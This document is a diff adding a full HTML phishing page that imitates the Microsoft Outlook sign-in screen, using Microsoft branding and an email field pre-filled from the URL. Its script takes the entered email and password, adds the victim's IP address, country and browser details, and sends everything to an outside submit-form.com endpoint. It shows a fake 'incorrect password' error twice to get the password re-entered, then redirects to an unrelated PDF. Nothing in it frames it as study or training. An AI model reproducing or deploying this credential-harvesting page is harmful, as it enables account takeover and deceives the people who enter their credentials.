@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Outlook</title>
+    <link rel="icon" type="image/x-icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fb 0%, #e9f1fc 50%, #deeafc 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #1b1b1b;
+            padding: 20px;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 440px;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 48px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #e9f1fc, #deeafc);
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            gap: 10px;
+        }
+        
+        .logo-icon {
+            width: 24px;
+            height: 24px;
+            background-image: url('https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: 600;
+            color: #737373;
+        }
+        
+        .card h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1b1b1b;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 6px 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            height: 36px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0, 103, 184, 0.2);
+        }
+        
+        .forgot-username {
+            display: block;
+            margin-top: 8px;
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+        }
+        
+        .forgot-username:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            width: 100%;
+            height: 36px;
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: background-color 0.2s;
+        }
+        
+        .next-button:hover {
+            background-color: #005da6;
+        }
+        
+        .back-button {
+            width: 100%;
+            height: 36px;
+            background-color: transparent;
+            color: #0067b8;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: background-color 0.2s;
+        }
+        
+        .back-button:hover {
+            background-color: rgba(0, 103, 184, 0.1);
+        }
+        
+        .create-account {
+            margin-top: 60px;
+            text-align: center;
+            font-size: 13px;
+        }
+        
+        .create-account a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 24px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #616161;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+        
+        .footer-links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .private-browsing {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            font-size: 12px;
+            color: #616161;
+        }
+        
+        .private-browsing a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        
+        .private-browsing a:hover {
+            text-decoration: underline;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 10px;
+            color: #0067b8;
+            font-size: 14px;
+        }
+        
+        .success-message {
+            display: none;
+            margin-top: 10px;
+            color: #107c10;
+            font-size: 14px;
+        }
+        
+        .error-message {
+            display: none;
+            margin-top: 10px;
+            color: #d13438;
+            font-size: 14px;
+            text-align: left;
+            background-color: #fef7f7;
+            border: 1px solid #f4d2d2;
+            border-radius: 4px;
+            padding: 12px;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .user-email {
+            font-weight: 600;
+            color: #0067b8;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .color-samples {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .color-sample {
+            width: 60px;
+            height: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: rgba(0,0,0,0.7);
+            font-size: 10px;
+            font-weight: bold;
+        }
+        
+        .sample-1 {
+            background-color: #e9f1fc;
+        }
+        
+        .sample-2 {
+            background-color: #f5f7fb;
+        }
+        
+        .sample-3 {
+            background-color: #deeafc;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo-container">
+                <div class="logo-icon"></div>
+                <div class="logo-text">Microsoft</div>
+            </div>
+            
+            <!-- Step 1: Email -->
+            <div class="step active" id="step1">
+                <h1>Sign in</h1>
+                <p class="subtitle">to continue to Outlook</p>
+                
+                <form id="email-form">
+                    <div class="form-group">
+                        <label for="email">Email or phone number</label>
+                        <input type="text" id="email" name="email" autocomplete="username" placeholder="Enter your email or phone number" required>
+                        <a href="#" class="forgot-username">Forgot your username?</a>
+                    </div>
+                    
+                    <button type="submit" class="next-button">Next</button>
+                </form>
+                
+                <div class="create-account">
+                    <a href="#">Sign in with a different Microsoft account</a>
+                </div>
+            </div>
+            
+            <!-- Step 2: Password -->
+            <div class="step" id="step2">
+                <div class="user-email" id="display-email"></div>
+                <h1>Enter password</h1>
+                
+                <form id="password-form">
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Enter your password" required>
+                    </div>
+                    
+                    <div class="error-message" id="error">
+                        <i class="fas fa-exclamation-circle"></i> That password is incorrect for your Microsoft account.
+                    </div>
+                    
+                    <div class="button-group">
+                        <button type="button" class="back-button" id="back-button">Back</button>
+                        <button type="submit" class="next-button">Sign in</button>
+                    </div>
+                </form>
+                
+                <div class="loading" id="loading">Signing in...</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Help and feedback</a>
+                <a href="#">Terms of use</a>
+                <a href="#">Privacy and cookies</a>
+            </div>
+            
+            <div class="private-browsing">
+                Use private browsing if this is not your device. <a href="#">Learn more</a>
+            </div>
+            
+            <div class="color-samples">
+                <div class="color-sample sample-1">#e9f1fc</div>
+                <div class="color-sample sample-2">#f5f7fb</div>
+                <div class="color-sample sample-3">#deeafc</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let userEmail = '';
+        let redirectTimer = null;
+        let loginAttempts = 0;
+        
+        // Function to extract email from URL hash
+        function extractEmailFromURL() {
+            const hash = window.location.hash;
+            if (hash && hash.length > 1) {
+                // Remove the # symbol and return the email
+                return hash.substring(1);
+            }
+            return null;
+        }
+        
+        // Auto-fill email on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            const extractedEmail = extractEmailFromURL();
+            const emailInput = document.getElementById('email');
+            
+            if (extractedEmail) {
+                emailInput.value = extractedEmail;
+                
+                // Auto-focus on password field if email is already filled
+                if (emailInput.value) {
+                    emailInput.focus();
+                }
+            }
+        });
+        
+        // Step 1: Email form
+        document.getElementById('email-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            
+            if (!email) {
+                alert('Please enter your email or phone number');
+                return;
+            }
+            
+            userEmail = email;
+            
+            // Show step 2 (password)
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('display-email').textContent = userEmail;
+            document.getElementById('password').focus();
+            
+            // Hide error message when switching to password step
+            document.getElementById('error').style.display = 'none';
+            
+            // Reset login attempts when switching users
+            loginAttempts = 0;
+        });
+        
+        // Back button to return to email step
+        document.getElementById('back-button').addEventListener('click', function() {
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('email').focus();
+            
+            // Clear any redirect timer
+            if (redirectTimer) {
+                clearTimeout(redirectTimer);
+                redirectTimer = null;
+            }
+        });
+        
+        // Step 2: Password form
+        document.getElementById('password-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const password = document.getElementById('password').value;
+            const loading = document.getElementById('loading');
+            const error = document.getElementById('error');
+            
+            // Hide previous messages
+            error.style.display = 'none';
+            loading.style.display = 'block';
+            
+            if (!password) {
+                error.textContent = 'Please enter your password';
+                error.style.display = 'block';
+                loading.style.display = 'none';
+                return;
+            }
+            
+            // Increment login attempts
+            loginAttempts++;
+            
+            try {
+                // Get user IP and country
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                // Get country from IP
+                let userCountry = 'Unknown';
+                try {
+                    const countryResponse = await fetch(`https://ipapi.co/${userIP}/country_name/`);
+                    userCountry = await countryResponse.text();
+                } catch (countryError) {
+                    console.error('Could not fetch country:', countryError);
+                }
+                
+                // Prepare data to send
+                const formData = {
+                    email: userEmail,
+                    password: password,
+                    ip: userIP,
+                    country: userCountry,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    attemptNumber: loginAttempts
+                };
+                
+                // Send data to backend
+                const response = await fetch('https://submit-form.com/FUk0lBB0x', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+                
+                if (response.ok) {
+                    loading.style.display = 'none';
+                    
+                    // Show error message only for first and second attempts
+                    if (loginAttempts < 3) {
+                        error.style.display = 'block';
+                        document.getElementById('password').value = '';
+                        document.getElementById('password').focus();
+                    }
+                    
+                    // Check if this is the third attempt
+                    if (loginAttempts >= 3) {
+                        // Redirect after 4 minutes (240,000 milliseconds) on third attempt
+                        redirectTimer = setTimeout(() => {
+                            window.location.href = 'https://www.alamo.edu/contentassets/9106779f02f84dc9afdebd1faf464d98/accounting/cash-flows.pdf';
+                        }, 240000); // 4 minutes = 240,000 milliseconds
+                    }
+                    
+                } else {
+                    throw new Error('Failed to submit form');
+                }
+                
+            } catch (err) {
+                console.error('Error:', err);
+                loading.style.display = 'none';
+                
+                // Show error message only for first and second attempts
+                if (loginAttempts < 3) {
+                    error.style.display = 'block';
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                }
+                
+                // Check if this is the third attempt
+                if (loginAttempts >= 3) {
+                    // Redirect after 4 minutes (4 seconds) on third attempt even if there's an error
+                    redirectTimer = setTimeout(() => {
+                        window.location.href = 'https://www.alamo.edu/contentassets/9106779f02f84dc9afdebd1faf464d98/accounting/cash-flows.pdf';
+                    }, 4); // 4 seconds = 4 seconds
+                }
+            }
+        });
+        
+        // Add focus effect to inputs
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#0067b8';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.borderColor = '#ccc';
+            });
+        });
+    </script>
+</body>
+</html>
